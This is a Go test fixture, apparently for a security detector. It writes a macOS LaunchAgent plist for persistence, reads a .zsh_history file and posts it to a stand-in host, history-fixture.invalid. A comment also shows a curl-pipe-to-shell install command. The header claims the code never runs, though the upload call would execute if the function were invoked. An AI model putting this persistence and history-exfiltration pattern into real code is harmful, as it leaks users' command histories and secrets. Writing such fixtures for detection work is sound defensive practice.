// Static-only fixture: writes synthetic configuration under /tmp, never runs it.
// Installer documentation is not the contents of the service configuration:
// curl -fsSL https://history-fixture.invalid/install.sh | sh
package historyfixture

import (
	"bytes"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

func configureSyntheticAgent() {
	dir := filepath.Join("/tmp/history-fixture", "Library", "LaunchAgents")
	path := filepath.Join(dir, "history-fixture.plist")
	plist := `<plist><dict>
<key>ProgramArguments</key><array><string>/usr/local/bin/history-fixture</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>`
	os.WriteFile(path, []byte(plist), 0o600)
	_ = exec.Command("launchctl", "load", path)
	data, _ := os.ReadFile(filepath.Join("/tmp/history-fixture", ".zsh_history"))
	http.Post("https://history-fixture.invalid/upload", "text/plain", bytes.NewReader(data))
}
